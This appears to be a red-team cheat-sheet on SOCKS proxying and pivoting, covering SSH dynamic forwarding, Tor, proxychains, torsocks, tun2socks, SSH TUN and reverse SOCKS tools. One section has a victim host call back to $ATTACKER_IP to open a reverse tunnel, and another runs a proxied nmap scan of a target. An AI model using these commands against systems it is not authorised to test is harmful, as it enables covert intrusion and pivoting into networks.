---
title: "SOCKS Proxying"
---

# 🧦 SOCKS Proxying

> SOCKS5 proxy for pivoting, anonymization, and traffic redirection.
> Covers: SSH dynamic forwarding, Tor, proxychains, torsocks.

::: tip 📖 What is SOCKS?
SOCKS is a protocol that routes traffic through a proxy server.  
Applications supporting SOCKS (or forced via proxychains/torsocks) can tunnel through it.
:::

## 🔄 SSH Dynamic SOCKS (local -> pivot)

```bash
# Create SOCKS proxy on attacker machine through a pivot
ssh -D $SOCKS_PORT $USER@$PIVOT_HOST
```

## 🧅 Tor SOCKS

```bash
# Start service
tor

# Use Tor's SOCKS5 proxy
curl --socks5 $SOCKS_HOST:$SOCKS_PORT  $URL
```

## 🔧 Proxychains

::: details Configuration (`/etc/proxychains4.conf`)

```ini
# /etc/proxychains4.conf
dynamic_chain      # Try proxies in order until success
# strict_chain     # All proxies in order (Tor needs only one)
# random_chain     # Random selection

# DNS over proxy (required for pivoting)
proxy_dns = true

[ProxyList]
socks5 $SOCKS_HOST $SOCKS_PORT
```

:::

```bash
proxychains -f /etc/proxychains.conf curl $URL
proxychains nmap -sT -Pn $TARGET_HOST
```

## 🧤 Torsocks

::: details Configuration (`/etc/tor/torsocks.conf`)

```ini
# /etc/tor/torsocks.conf
server = $SOCKS_HOST
server_port = $SOCKS_PORT
local = 127.0.0.1       # DNS leaks protection
allow_inbound = 0       # prevent local listening (0=disable)

# Optional isolation:
# isolate_dest_addr = 1
# isolate_dest_port = 1
# isolate_client_addr = 1
```

:::

```bash
# Usage
torsocks curl $URL
torsocks -i bash    # Interactive shell with bash
```

#### Advanced Options

```bash
# Specific config file
torsocks -f /path/to/torsocks.conf <CMD>

# Bind to specific source IP
torsocks -a 10.0.0.2 curl $URL

# Use different SOCKS port
torsocks -P 9051 curl $URL

# Local bind (for programs listening locally)
torsocks -L 8080 python3 -m http.server
```

## tun2socks (system-wide)

> Route all traffic through SOCKS (VPN-like). Useful for tools without SOCKS support.

```bash
# Install
go install github.com/ambrop72/badvpn-go-tun2socks@latest
```

```bash
# Create TUN interface
sudo ip tuntap add dev tun0 mode tun
sudo ip addr add 10.0.0.2/24 dev tun0
sudo ip link set tun0 up

# Bind traffic via Tor SOCKS5
sudo go-tun2socks -device tun0 -proxy socks5://$SOCKS_HOST:$SOCKS_PORT

# Set default route
sudo ip route add default dev tun0
```

## 🛡️ Advanced Pivoting (Red Team OPSEC)

### Mesh VPN (Tailscale-based)

```bash
# Install
https://github.com/Yeeb1/SockTail
```

```bash
# SockTail - ephemeral SOCKS over Tailscale
./SockTail $HOSTNAME $AUTH_KEY
```

### Reverse SOCKS with mTLS (resocks)

```bash
# Install
https://github.com/RedTeamPentesting/resocks
```

```bash
# Attacker
resocks listen --key $CONNECTION_KEY

# Victim (reverse connect)
resocks $ATTACKER_IP --key $CONNECTION_KEY
```

### SSH TUN (Layer 3 VPN)

::: details SSH TUN (Layer 3 over SSH)

```bash
# Server: /etc/ssh/sshd_config
PermitTunnel yes

# Client
ssh $USER@$JUMP_HOST -w any:any

# Configure tunnel interfaces
# Client
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0
ip link set tun0 up

# Server
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0
ip link set tun0 up

# Enable NAT on server
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
```

:::
